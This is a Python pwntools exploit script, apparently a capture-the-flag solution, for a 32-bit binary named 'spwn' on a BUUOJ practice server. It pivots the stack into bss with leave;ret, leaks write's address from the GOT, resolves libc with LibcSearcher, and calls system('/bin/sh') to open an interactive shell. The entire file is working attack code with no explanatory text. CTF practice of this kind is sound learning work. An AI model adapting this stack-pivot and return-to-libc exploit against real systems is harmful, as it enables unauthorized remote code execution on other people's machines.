# coding:utf-8

from pwn import *
from LibcSearcher import *

context(os='linux', arch='i386', log_level='debug')
#p = process('spwn')
p = remote('node3.buuoj.cn', 26145)
elf = ELF('spwn')

write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.sym['main']
bss_addr = 0x0804A300
leave_ret = 0x08048511

payload1 = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
p.recvuntil('name?')
p.send(payload1)

padding = 'a' * 0x18
payload2 = padding + p32(bss_addr - 4) + p32(leave_ret) # 栈迁移
p.recvuntil('say?')
p.send(payload2)

write_addr = u32(p.recv(4))
print('write_addr: ', hex(write_addr))

libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')

payload3 = p32(system_addr) + p32(main_addr) + p32(str_bin_sh)
p.recvuntil('name?')
p.send(payload3)

p.recvuntil('say?')
p.send(payload2)

p.interactive()


